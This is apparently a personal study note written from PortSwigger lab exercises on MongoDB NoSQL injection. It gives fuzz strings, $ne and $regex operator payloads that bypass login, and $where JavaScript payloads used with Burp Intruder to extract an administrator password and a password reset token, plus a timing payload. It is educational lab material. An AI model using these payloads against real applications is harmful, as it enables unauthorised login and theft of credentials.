# NoSQL - MongoDB  

## Identify NoSQL injection  

>Submit a fuzz string in the value of the JSON POST or GET web parameter.  
>Payload example strings for MongoDB:  

```
'
''
"
""
\'
'"`{
;$Foo}
$Foo \xYZ
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000.  
' && 0 && 'x
' && 1 && 'x
 'fizzy'||'1'=='1'
||1||
fizzy'||1||'
fizzy' && 0 && 'x
fizzy' && 1 && 'x
```  

>Determine the meta characters processed and breakng syntax, with true and false statements.  

>JavaScript condition payload evaluates to true, such as `'||'1'=='1`  

>Nnull character after the category value in MongoDB may ignore all characters after a null characters:  

```
%00
\u0000
```  

>Show sensitive database information with allways true statement `../filter?category=Gifts'||1||'`

## NoSQL operator injection  

>inject query operators to manipulate NoSQL queries:  

```
$where  
$ne 
$in 
$regex
```  

>Content Type Converter extension to automatically convert the request method and change a URL-encoded POST request to JSON.  

>`Content-Type` header to `application/json`  

>NoSQL bypass authentication using the following payload:  

```json
{
"username":{
"$ne":"invalid"
}
,"password":{
"$ne":"invalid"
}
}
```  

>NoSQL operator injection to bypass authentication:  

```json
{
	"username":{
		"$regex":"admin.*"
	},
	"password":{
		"$ne":""
	}
}
```  

>Send the request again. Notice that this successfully logs you in as the admin user.  

![portswigger_nosql_auth_bypass.png](/images/portswigger_nosql_auth_bypass.png)  

## NoSQL Data Extract  

>NoSQL query uses the `$where` operator, attempt to inject JavaScript functions into this query so it returns sensitive data.  

```
{"$where":"this.username == 'admin'"}

admin' && this.password.match(/\d/) || 'a'=='b
```  

>Identifying field names, by comparing results in responses.  

```
admin' && this.username!=' 
admin' && this.foo!='
```  

>[PortSwigger Lab: Exploiting NoSQL injection to extract data](https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-syntax-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-data)  
>Vulnerable MongoDB NoSQL database site.  

>URL Encode valid JavaScript payload in the user parameter `wiener'+'`  
>Identify the password length of administrator,  
>Change the user parameter to `administrator' && this.password.length < 9 || 'a'=='b` and URL encode payload.  

0. Change user parameter to `administrator' && this.password[§0§]=='§a§`,  Make sure to URL-encode the payload.  
1. Set two payload positions for password character position and password lowercase alphabet character.  
2. Cluster Bomb attack iterates all combinations   
3. Set payloads 1 as position password max length and 2 alphabet characters  
4. Start Intruder Attack  
5. Sort by payload position 1 and lenth results  
6. result of the password `ycpxhlee`  

![portswigger_nosql_auth_data_extract_Password.png](/images/portswigger_nosql_auth_data_extract_Password.png)  

>Exploiting NoSQL operator injection to extract unknown fields  

>NoSQL password payload, `{"$ne":"invalid"}` response indicates that the `$ne` operator has been accepted and the application is vulnerable.  

>determine the length of possible hidden fields:  

```JSON
{
"username":"carlos",
"password":{"$ne":""},
"$where":"function(){ if(Object.keys(this)[5].length == 1) return 1; else 0;}"
}
```  

>Send to intruder with where operator payload, to retrieve field parameter names from database.  
>Two payloads, first identifies the character position number, and the second identifies the character itself.  
>set the field key to `2` to identify second field in database, and so on...  

```json
{
	"username":"carlos",
	"password":{
		"$ne":"invalid"
	}, 
	"$where":"Object.keys(this)[2].match('^.{§§}§§.*')"
}

```  

>NoSQL Fields identified:  

```
[0] _id
[1] username
[2] password
[3] email
[4] passwordReset

```  
>Next Cluster bomb attack payload is to get value of found JSON parameters, password reset token `passwordReset`  

```
"$where":"this.passwordReset.match('^.{§§}§§.*')"
```

>obtained the field name `passwordReset` in first intruder attack  
>and second intruder attach payload above give the token to reset user password.  

>Browse to the target URL `/forgot-password?passwordReset=966fbc16def16921`  

>After Cluster bomb attack identified the case senitive JSON field and then value of the password reset token retrieved using intruder:

![portswigger_nosql_auth_data_extract_hidden_fields_and_values.png](/images/portswigger_nosql_auth_data_extract_hidden_fields_and_values.png)  

>[PortSwigger Lab: Exploiting NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)  

## Timing based injection  

>Payload to determine vulnerable based on time delayed response: `{"$where": "sleep(5000)"}`  

----  
